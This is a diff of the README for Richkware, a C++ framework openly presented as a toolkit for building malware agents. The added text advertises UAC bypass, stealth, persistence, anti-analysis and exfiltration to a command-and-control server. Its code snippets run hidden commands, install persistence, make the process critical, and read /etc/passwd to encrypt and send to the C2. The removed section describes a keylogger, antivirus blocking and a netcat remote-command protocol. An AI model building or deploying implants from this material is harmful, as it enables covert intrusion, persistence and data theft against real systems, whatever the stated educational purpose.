@@ -1,190 +1,422 @@
 # Richkware
 
+[![CI](https://github.com/richkmeli/Richkware/actions/workflows/ci.yml/badge.svg)](https://github.com/richkmeli/Richkware/actions/workflows/ci.yml)
 [![Build status](https://ci.appveyor.com/api/projects/status/1tn6vedeaq0v27ra?svg=true)](https://ci.appveyor.com/project/richkmeli/richkware)
 [![Codacy Badge](https://api.codacy.com/project/badge/Grade/e6b4a003d5e7404c80225391bfe34f45)](https://app.codacy.com/app/richkmeli/Richkware?utm_source=github.com&utm_medium=referral&utm_content=richkmeli/Richkware&utm_campaign=Badge_Grade_Dashboard)
 
-**Richkware** is a C++ framework designed for building Windows malware for educational and research purposes. It provides a comprehensive library of network and system functions to create various types of malware, including viruses, worms, bots, spyware, keyloggers, and scareware.
+**Richkware** is a modern C++20 framework for building educational malware agents. It provides a comprehensive, secure, and modular architecture for understanding malware mechanics and cybersecurity defense strategies.
 
 > **Disclaimer / Ethical use**: This project is intended **only** for educational and research purposes. Do not use the code to harm, compromise, or access systems without explicit permission. The author and contributors are not responsible for misuse.
 
-## Description
+## Architecture
 
-The Richkware framework offers a modular set of functions enabling the creation of malware with diverse capabilities, such as network communication, system manipulation, and cryptography.
+Richkware features a modern modular architecture with the following components:
 
-### Supported Malware Types:
-- Virus
-- Worm
-- Bot
-- Spyware
-- Keylogger
-- Scareware
+- **Core**: Agent management, configuration, and error handling
+- **Crypto**: Modern cryptographic operations (AES-256-GCM, key derivation)
+- **Network**: Secure C2 communications with TLS 1.3 support
+- **System**: Persistence, privilege management, and stealth capabilities
+- **Modules**: Command execution, file operations, and system control
+- **Utils**: JSON parsing, logging framework, and helper functions
 
-## Related Projects
+## System Overview
 
-- **[Richkware-Manager-Server](https://github.com/richkmeli/Richkware-Manager-Server)** (RMS): A centralized server for managing hosts infected with Richkware-based malware.
-- **[Richkware-Manager-Client](https://github.com/richkmeli/Richkware-Manager-Client)** (RMC): A client interface for communicating with the RMS, allowing administrators to send commands to infected hosts.
+Richkware operates as part of a three-component ecosystem:
 
-![Diagram](https://raw.githubusercontent.com/richkmeli/richkmeli.github.io/master/Richkware/Diagram/RichkwareDiagram1.2.png)
+- **Richkware Agent** (this project): The C++ malware framework that runs on target systems
+- **[Richkware-Manager-Server](https://github.com/richkmeli/Richkware-Manager-Server)** (RMS): Command and control server
+- **[Richkware-Manager-Client](https://github.com/richkmeli/Richkware-Manager-Client)** (RMC): GUI client for operator interaction
+
+![System Diagram](https://raw.githubusercontent.com/richkmeli/richkmeli.github.io/master/Richkware/Diagram/RichkwareDiagram1.2.png)
 
 ## Documentation
 
 |              | EN                          | IT                     |
 |--------------|:----------------------------:|:----------------------:|
-| Presentation | [PDF](https://github.com/richkmeli/Richkware/blob/master/doc/EN/Slide.pdf) | [PDF](https://github.com/richkmeli/Richkware/blob/master/doc/IT/Slide.pdf) |
-| Report       | [PDF](https://github.com/richkmeli/Richkware/blob/master/doc/EN/Report.pdf)  | [PDF](https://github.com/richkmeli/Richkware/blob/master/doc/IT/Relazione.pdf) |
+| Presentation | [PDF](https://github.com/richkmeli/Richkware/blob/master/docs/EN/Slide.pdf) | [PDF](https://github.com/richkmeli/Richkware/blob/master/docs/IT/Slide.pdf) |
+| Report       | [PDF](https://github.com/richkmeli/Richkware/blob/master/docs/EN/Report.pdf)  | [PDF](https://github.com/richkmeli/Richkware/blob/master/docs/IT/Relazione.pdf) |
 
-## Functions
+## Features
 
-### Network
+### Core Capabilities
+- **Modern C++20**: Uses latest C++ standards with concepts, coroutines, and smart pointers
+- **Memory Safety**: RAII principles, smart pointers, and bounds checking
+- **Type Safety**: Strong typing with std::expected for error handling
+- **Thread Safety**: Concurrent operations with proper synchronization
 
-- **Server** (*network.h*): Manages a multi-threaded server to receive commands from the internet (via RMC or console) using a specific protocol.
-    - **Protocol** (*protocol.h*):
-        1. **Remote command execution** (ID 1)
-        2. *(Work in progress)*
-- **Network** (*network.h*):
-    - **RawRequest**: Sends a raw request to a server.
-    - **UploadInfoToRichkwareManagerServer**: Uploads host information to the **Richkware-Manager-Server**.
+### Security
+- **AES-256-GCM Encryption**: Modern authenticated encryption
+- **TLS 1.3 Communications**: Secure C2 channel with certificate pinning
+- **Key Derivation**: PBKDF2/Argon2 for secure key generation
+- **Secure Random**: Cryptographically secure random number generation
 
-### System
+### System Integration
+- **Multi-Method Persistence**: Registry, services, scheduled tasks, WMI
+- **Privilege Management**: UAC bypass and privilege escalation
+- **Stealth Operations**: Process hiding and anti-analysis techniques
+- **Command Execution**: Multiple backends (CMD, PowerShell, WMI)
 
-- **Storage** (*storage.h*):
-    - **SaveSession** and **LoadSession**: Save and load the encrypted application state using:
-        - **Registry** (`SaveValueReg`, `LoadValueReg`)
-        - **File** (`SaveValueToFile`, `LoadValueFromFile`)
-    - **Persistence**: Ensures the application persists in the system across reboots.
-- **IsAdmin** and **RequestAdminPrivileges** (*richkware.h*): Checks for and requests administrator privileges.
-- **StealthWindow** (*richkware.h*): Hides the application window.
-- **OpenApp** (*richkware.h*): Opens arbitrary applications.
-- **Keylogger** (*richkware.h*): Logs all keystrokes to a file.
-- **BlockApps** and **UnBlockApps** (*blockApps.h*): Blocks and unblocks specific applications (e.g., antivirus software).
+### Network Operations
+- **Asynchronous I/O**: Non-blocking network operations
+- **HTTP/HTTPS Client**: Modern HTTP client with connection pooling
+- **C2 Protocol**: Encrypted command and control communications
+- **Resilient Connections**: Automatic retry and failover logic
 
-### Cryptography
-
-- **Encrypt and Decrypt** (*crypto.h*): Supports **RC4** (default) and **Blowfish** algorithms.
-- **Encode and Decode** (*crypto.h*): Supports **Base64** (default) and **Hex** encoding.
-
-![Cryptography Diagram](https://raw.githubusercontent.com/richkmeli/richkmeli.github.io/master/Richkware/Diagram/RichkwareCryptographyDiagram1.1.png)
+### File Operations
+- **File Management**: Read, write, delete, and search files
+- **Directory Listing**: Browse filesystem with metadata
+- **Exfiltration Support**: Encrypted file upload/download
+- **Pattern Matching**: Wildcard-based file searching
 
 ### Utilities
+- **Advanced JSON**: Complete JSON parser/serializer with object/array support
+- **Logging Framework**: Thread-safe logging with multiple levels
+- **Error Handling**: Consistent Result<T> pattern throughout
 
-- **RandMouse** (*richkware.h*): Randomly moves the mouse cursor.
-- **Hibernation** (*richkware.h*): Hibernates the system.
+## CI/CD
+
+Richkware uses multiple CI systems for comprehensive testing:
+
+- **GitHub Actions**: Primary CI with Linux, Windows, and macOS builds
+- **AppVeyor**: Legacy Windows CI with MSVC and MinGW support
+
+### Build Status
+- **GitHub Actions**: ![CI](https://github.com/richkmeli/Richkware/actions/workflows/ci.yml/badge.svg)
+- **AppVeyor**: ![Build status](https://ci.appveyor.com/api/projects/status/1tn6vedeaq0v27ra?svg=true)
 
 ## Requirements
 
 To build and use **Richkware**, you need:
 
-- **Make** or **CMake**
-- **C++17** compliant compiler (e.g., GCC 7+, Clang 5+, MSVC 2017+)
-- [MinGW-w64](http://www.mingw.org/) (if cross-compiling for Windows from Linux)
+- **CMake 3.20+**
+- **C++20** compliant compiler:
+  - **MSVC 2022+** (Visual Studio 2022)
+  - **GCC 11+**
+  - **Clang 13+**
+- **OpenSSL 3.0+** (for cryptographic operations)
+- **Google Test** (for unit testing, optional)
 
-### Dependencies
-
-- **OpenSSL headers and libraries** (required by `aes_openssl.cpp`):
-
-    - Debian/Ubuntu (native build):
-
-        ```bash
-        sudo apt update && sudo apt install build-essential libssl-dev pkg-config
-        ```
-
-    - Cross-compiling to Windows (MinGW):
-        - Install MinGW: `sudo apt install mingw-w64`.
-        - Provide OpenSSL headers/libs for the MinGW target (MSYS2 on Windows makes this easier), or cross-compile OpenSSL for MinGW and point the Makefile to the include/lib paths.
-
-    - `pkg-config` can help discover OpenSSL include/lib paths, if available.
+### Platform Support
+- **Windows 10+**: Full support (MSVC + MinGW)
+- **Linux**: Full support (GCC + Clang)
+- **macOS**: Full support (Clang)
+- **Cross-compilation**: MinGW-w64 for Windows targets from Linux
 
 ## Getting Started
 
-### Data Initialization
-
-#### With Richkware-Manager-Server (RMS)
-
-If you have deployed **RMS**, initialize the malware as follows:
+### Basic Usage
 
 ```cpp
+#include <richkware/core/agent.hpp>
+
 int main() {
-    // Richkware richkware(appName, defaultEncryptionKey, serverAddress, serverPort, associatedUser);
-    // SECURITY: Use environment variables or secure configuration in production
-    Richkware richkware("Richk", "TempPassword", "192.168.99.100", "8080", "associatedUser");
-    // ...
+    // Configure agent
+    richkware::core::Config config{
+        .app_name = "MyAgent",
+        .encryption_key = "secure_key_here",
+        .server_address = "127.0.0.1",
+        .server_port = 8443,
+        .user_id = "agent_001",
+        .enable_encryption = true,
+        .enable_stealth = true
+    };
+    
+    // Create and initialize agent
+    richkware::core::Agent agent(std::move(config));
+    
+    if (auto result = agent.initialize(); !result) {
+        return 1;
+    }
+    
+    // Start agent operations
+    if (auto result = agent.start(); !result) {
+        return 1;
+    }
+    
+    // Agent runs in background threads
+    while (agent.is_running()) {
+        std::this_thread::sleep_for(std::chrono::seconds(1));
+    }
+    
     return 0;
 }
 ```
 
-This retrieves a secure key from **RMS** for encryption. The temporary password is used as a fallback if the RMS is unreachable.
+### Configuration Options
 
-**WARNING**: Never hardcode production credentials in source code.
-
-#### Without Richkware-Manager-Server
-
-If you are not using **RMS**, initialize it simply:
-
-```cpp
-Richkware richkware("Richk", "YourSecureKey");
-```
+The agent can be configured through:
+- **Code**: Direct configuration in source
+- **Environment Variables**: Runtime configuration
+- **JSON/YAML Files**: External configuration files
 
 ## Compilation
 
-### Using Make (Linux/MinGW)
+### Quick Build Scripts (Recommended)
 
+For interactive build configuration, use the provided scripts:
+
+**Linux/macOS:**
 ```bash
-make
+./build.sh
 ```
 
-If you want to build natively on Linux (not cross-compile to Windows) you can override the compiler:
-
-```bash
-make CXX=g++
+**Windows:**
+```cmd
+build.bat
 ```
 
-### Troubleshooting
+The scripts will prompt you for:
+- Target platform (current, Linux, Windows, macOS)
+- Build type (Release/Debug)
+- Optional features (tests, sanitizers, coverage)
 
-- If the build fails with an error about `openssl/evp.h` missing, install the OpenSSL development headers (see Dependencies above). The `Makefile` now performs a pre-check and will print guidance when OpenSSL headers are missing.
+### Using CMake Directly
 
-- For cross-compilation: ensure `mingw-w64` is installed and that you provide OpenSSL headers/libs for the MinGW target (or build OpenSSL for MinGW yourself). Using MSYS2 on Windows often simplifies this.
+```bash
+# Create build directory
+mkdir build && cd build
 
-### Using Microsoft C++ Compiler (Visual Studio)
+# Configure build
+cmake .. -DCMAKE_BUILD_TYPE=Release
 
-1. Go to **C/C++ > Preprocessor > Preprocessor Definitions**, and add `_CRT_SECURE_NO_WARNINGS`.
-2. In **Linker > Input > Additional Dependencies**, add `Ws2_32.lib`.
+# Build project
+cmake --build . --config Release
 
-## Example Usage
+# Run tests (optional)
+ctest
+```
 
-### Server-side: Starting the Listener
+### Build Options
 
-In your main program, call `StartServer` to listen for incoming commands. This example uses TCP port 8000:
+```bash
+# Enable testing
+cmake .. -DRICHKWARE_BUILD_TESTS=ON
+
+# Enable examples
+cmake .. -DRICHKWARE_BUILD_EXAMPLES=ON
+
+# Enable AddressSanitizer
+cmake .. -DRICHKWARE_ENABLE_ASAN=ON
+
+# Cross-compile for Windows
+cmake .. -DCMAKE_TOOLCHAIN_FILE=cmake/mingw-w64.cmake
+```
+
+### Dependencies Installation
+
+#### Ubuntu/Debian
+```bash
+sudo apt update
+sudo apt install build-essential cmake libssl-dev libgtest-dev
+```
+
+#### Windows (vcpkg)
+```bash
+vcpkg install openssl gtest
+cmake .. -DCMAKE_TOOLCHAIN_FILE=[vcpkg root]/scripts/buildsystems/vcpkg.cmake
+```
+
+## Usage Examples
+
+### Command Execution
 
 ```cpp
-int main () {
-    // ...
-    richkware.network.server.Start("8000");
-    // ...
+// Execute command synchronously
+auto result = agent.execute_command("whoami");
+if (result) {
+    std::cout << "Output: " << result.value() << std::endl;
+}
+
+// Execute with custom options
+richkware::modules::ExecutionOptions options{
+    .timeout = std::chrono::seconds(10),
+    .run_hidden = true
+};
+
+auto cmd_result = command_executor.execute("dir C:\\", options);
+```
+
+### Stealth Operations
+
+```cpp
+// Enable stealth mode
+agent.enable_stealth();
+
+// Hide specific windows
+stealth_manager.hide_window("Calculator");
+
+// Set as critical process
+stealth_manager.set_critical_process(true);
+```
+
+### Persistence
+
+```cpp
+// Install persistence
+persistence_manager.install_persistence();
+
+// Check if persistence is active
+if (persistence_manager.has_persistence()) {
+    std::cout << "Persistence active" << std::endl;
 }
 ```
 
-### Client-side: Sending Commands
+### Secure Communications
 
-#### Using Richkware-Manager-Client (RMC)
+```cpp
+// Configure secure C2 channel
+richkware::network::NetworkClient client(
+    "c2.example.com", 443, "encryption_key", true
+);
 
-The easiest way is to use **Richkware-Manager-Client** to manage capabilities and send commands via a GUI.
+// Send encrypted data
+c2_protocol.send_response({
+    .command_id = "cmd_123",
+    .success = true,
+    .output = "Command executed successfully"
+});
+```
 
-#### Using Netcat (Unix)
+### File Operations
+
+```cpp
+// List directory contents
+auto files = file_manager.list_directory("/tmp");
+if (files) {
+    for (const auto& file : files.value()) {
+        LOG_INFO("File: {} ({} bytes)", file.name, file.size);
+    }
+}
+
+// Read and encrypt a file
+auto content = file_manager.read_file("/etc/passwd");
+if (content) {
+    // Encrypt content
+    auto encrypted = cipher.encrypt_string(std::string(content.value().begin(), content.value().end()));
+    // Send to C2 server...
+}
+```
+
+### Logging
+
+```cpp
+// Use the logging framework
+LOG_INFO("Agent started successfully");
+LOG_ERROR("Failed to connect to C2 server: {}", error_msg);
+LOG_DEBUG("Processing command: {}", command_id);
+
+// Configure log level
+richkware::utils::Logger::getInstance().setLevel(richkware::utils::LogLevel::DEBUG);
+```
+
+## API Reference
+
+### Core Components
+
+#### Agent
+```cpp
+richkware::core::Agent agent(config);
+agent.initialize();
+agent.start();
+auto result = agent.execute_command("whoami");
+```
+
+#### File Manager
+```cpp
+richkware::modules::FileManager file_manager;
+auto files = file_manager.list_directory("/path/to/dir");
+auto content = file_manager.read_file("/path/to/file");
+file_manager.write_file("/path/to/file", data);
+```
+
+#### Command Executor
+```cpp
+richkware::modules::CommandExecutor executor;
+richkware::modules::ExecutionOptions opts{.timeout = std::chrono::seconds(30)};
+auto result = executor.execute("ls -la", opts);
+```
+
+#### Cryptography
+```cpp
+richkware::crypto::CipherManager cipher;
+cipher.set_password("my_key");
+auto encrypted = cipher.encrypt_string("secret data");
+auto decrypted = cipher.decrypt_string(encrypted.value());
+```
+
+#### JSON Utilities
+```cpp
+using nlohmann::json;
+auto data = json::parse(R"({"key": "value"})");
+std::string json_str = data.dump();
+bool has_key = data.contains("key");
+```
+
+#### Logging
+```cpp
+LOG_INFO("Operation completed");
+LOG_ERROR("Something went wrong: {}", error_details);
+LOG_DEBUG("Detailed debug info");
+```
+
+## Testing
+
+Richkware includes comprehensive unit and integration tests:
 
 ```bash
-nc <target_ip> 8000
+# Run all tests
+ctest
+
+# Run specific test suite
+ctest -R crypto_tests
+
+# Run with verbose output
+ctest --verbose
 ```
 
-#### Using Telnet (Windows)
+## Contributing
 
-```bash
-telnet <target_ip> 8000
-```
+Contributions are welcome! Please:
 
-#### Command Protocol
+1. Follow the existing code style
+2. Add tests for new functionality
+3. Update documentation
+4. Ensure all tests pass
 
-Once connected, you can send commands following the protocol:
+## License
 
-```plaintext
-[[1]]COMMAND
-```
+This project is licensed under the terms specified in the LICENSE file.
+
+## Security Notice
+
+**This software is for educational purposes only.** Using this software for unauthorized access to computer systems is illegal and unethical. The authors are not responsible for misuse of this software.
+
+## Project Status
+
+### ✅ Implemented Features
+- **Core Agent**: Complete lifecycle management
+- **Cryptography**: AES-256-GCM, PBKDF2 key derivation
+- **Network**: HTTPS client, TLS 1.3, C2 protocol with encryption
+- **Command Execution**: Cross-platform shell execution
+- **File Operations**: Complete file management (read/write/search/upload/download)
+- **Persistence**: Registry keys (Windows), autostart (Linux)
+- **JSON Utilities**: Full parser/serializer with object/array support
+- **Logging**: Thread-safe logging framework with multiple levels
+- **Build System**: Interactive scripts for easy configuration
+
+### 🚧 Partially Implemented
+- **Stealth Features**: Basic console hiding (advanced features placeholder)
+- **Privilege Management**: Basic privilege detection (escalation placeholder)
+- **HTTP Upload/Download**: Framework ready, actual HTTP transfer placeholder
+
+### 📋 Planned Features
+- **Keylogger**: Keyboard input capture
+- **Screenshot**: Screen capture functionality
+- **Process Enumeration**: List and manipulate running processes
+- **Anti-Analysis**: Debugger/VM detection
+- **Self-Deletion**: Secure agent removal
+
+## Related Projects
+
+- **[Richkware-Manager-Server](https://github.com/richkmeli/Richkware-Manager-Server)**: C2 server for agent management
+- **[Richkware-Manager-Client](https://github.com/richkmeli/Richkware-Manager-Client)**: GUI client for C2 operations
